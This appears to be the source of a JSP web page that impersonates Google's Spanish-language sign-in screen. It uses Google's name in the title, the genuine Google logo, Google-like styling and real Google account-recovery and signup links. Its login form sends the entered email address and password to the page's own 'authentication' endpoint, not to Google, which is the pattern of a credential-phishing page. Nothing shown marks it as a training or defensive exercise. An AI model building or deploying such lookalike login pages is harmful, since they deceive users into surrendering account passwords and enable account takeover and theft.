<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html>
<head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Iniciar Sesión - Google</title>
        <style>
            body {
                font-family: 'Roboto', sans-serif;
                background-color: #f5f5f5;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }

            .login-container {
                background-color: white;
                width: 360px;
                padding: 40px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                border-radius: 8px;
                text-align: center;
            }

            .login-container img {
                width: 75px;
                margin-bottom: 20px;
            }

            .login-container h2 {
                font-size: 24px;
                font-weight: 400;
                margin-bottom: 20px;
                color: #202124;
            }

            input[type="email"], input[type="password"] {
                width: 100%;
                padding: 14px;
                margin: 10px 0;
                border-radius: 4px;
                border: 1px solid #dadce0;
                font-size: 16px;
                box-sizing: border-box;
            }

            input[type="submit"] {
                width: 100%;
                padding: 14px;
                background-color: #1a73e8;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
                margin-top: 20px;
            }

            input[type="submit"]:hover {
                background-color: #1765c3;
            }

            .link {
                color: #1a73e8;
                text-decoration: none;
                font-size: 14px;
                display: block;
                margin-top: 20px;
            }

            .link:hover {
                text-decoration: underline;
            }
        </style>
</head>
<body>
<div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
        <h2>Iniciar sesión</h2>
        <form action="authentication" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required><br>
            <input type="password" name="password" placeholder="Contraseña" required><br>
            <input type="submit" value="Iniciar sesión">
        </form>
        <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dgoogle%26rlz%3D1C1GCEU_esCO1071CO1071%26oq%3Dgoogle%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOTIHCAEQABiPAjIHCAIQABiPAjIGCAMQRRg9MgYIBBBFGD0yBggFEEUYPTIGCAYQRRhB0gEHNjQ3ajBqMagCALACAA%26sourceid%3Dchrome%26ie%3DUTF-8&ddm=0&dsh=S-1357014271%3A1724183064509467&ec=futura_gmv_dt_so_72586115_e&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=es&ifkv=Ab5oB3rBZoFj440mFG5WnZUjHl6FB06t0A-M_D57eMrh2I7hwsstwCAiPtikhaeLUCIAxmmCILSMuA" class="link">¿Olvidaste tu contraseña?</a>
        <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com/search?q%3Dgoogle%26rlz%3D1C1GCEU_esCO1071CO1071%26oq%3Dgoogle%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOTIHCAEQABiPAjIHCAIQABiPAjIGCAMQRRg9MgYIBBBFGD0yBggFEEUYPTIGCAYQRRhB0gEHNjQ3ajBqMagCALACAA%26sourceid%3Dchrome%26ie%3DUTF-8&ddm=0&dsh=S-2112924383:1724183307279803&ec=futura_gmv_dt_so_72586115_e&flowEntry=SignUp&flowName=GlifWebSignIn&hl=es&ifkv=Ab5oB3oA_JtBR-dFapl7JfvVxPWhvRRWNdS3OLoOVrjJib5WSqUfBQDClBip5TIFPoP-aOAbizr8Ng&TL=AKeb6mxNPotZoKcdsBwQiCvkT51cOYjVczLI_r4aLtG6-OYrD8IzWzL_eYUryyEY" class="link">Crear cuenta</a>
    </div>
</body>
</html>